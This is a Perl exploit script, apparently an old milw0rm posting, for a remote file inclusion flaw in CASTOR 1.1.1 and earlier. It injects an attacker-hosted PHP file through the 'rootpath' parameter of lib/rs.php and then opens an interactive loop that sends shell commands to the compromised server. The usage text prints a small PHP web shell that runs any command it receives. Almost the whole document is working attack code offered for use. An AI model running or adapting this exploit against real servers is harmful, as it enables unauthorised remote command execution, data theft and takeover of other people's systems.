#!/usr/bin/perl
#
# CASTOR <= 1.1.1 Remote Command Execution Vulnerability
#
# Risk : High (Remote Code Execution)
#
# Url: svn.gna.org/svn/castor/trunk
#
# Exploit:
#   http://www.site.com/[path]/lib/rs.php?rootpath=[Evil_Script]
#
# (c)oded and f0und3d by Kw3[R]Ln <ciriboflacs[AT]YaHOo.com>
#
#  Romanian Security Team .: hTTp://RST-CREW.NET :.
#
# Shoutz to [Oo], str0ke, th0r and all members of RST !

use LWP::Simple;

print "...........................[RST]...............................\n";
print ".                                                             .\n";
print ".  CASTOR <= 1.1.1 Remote Command Execution Vulnerability     .\n";
print ".                                                             .\n";
print "...............................................................\n";
print ".       Romanian Security Team -> hTTp://RST-CREW.NET         .\n";
print ".       [c]oded by Kw3rLN - kw3rln[AT]rst-crew.net            .\n";
print "...............................................................\n\n";

my $kw3,$path,$shell,$conexiune,$cmd,$data ;


if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}

$path = $ARGV[0];
chomp($path);
$shell = $ARGV[1];
chomp($shell);

$path = $path."/lib/rs.php";


sub usage(){
	print "Usage    : perl $0 host/path http://site.com/cmd.txt\n\n";
	print "Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n";
        print 'Shell    : <?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>';
           }

while ()
{
print "[kw3rln].[rst] :~\$ ";
chomp($cmd=<STDIN>);
if ($cmd eq "exit") { exit(0);}

$kw3 = $path."?rootpath=".$shell."?&cmd=".$cmd;
if ($cmd eq "")
  { print "Enter your command !\n"; }
else
  { $data=get($kw3); print $data ; }

}

# milw0rm.com [2006-10-21]